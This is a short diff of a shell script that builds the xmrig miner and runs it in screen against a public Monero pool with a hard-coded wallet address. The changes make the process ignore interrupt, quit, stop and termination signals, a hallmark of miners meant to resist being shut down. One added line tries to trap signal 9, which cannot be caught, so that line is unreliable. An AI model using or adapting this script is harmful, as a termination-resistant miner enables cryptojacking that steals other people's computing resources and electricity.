@@ -8,8 +8,9 @@ cmake .. -DUV_LIBRARY=/usr/lib64/libuv.a
 make
 screen
 trap "" 15
-trap '' SIGINT
-trap ''  SIGQUIT
-trap '' SIGTSTP
+trap "" 2
+trap "" 3
+trap "" 20
+trap "" 9
 ./xmrig --currency monero -o pool.supportxmr.com:3333 -u 89jXMztCjeTZrtbuKL6SKQHJiU1nsdBqzW3XohH5iYFqNibkpAqcjSAZW7HiSTQCuJG2XV8cK58oiYrm2UHD23NUDy1Lmf7 -p x -k --donate-level=1
 
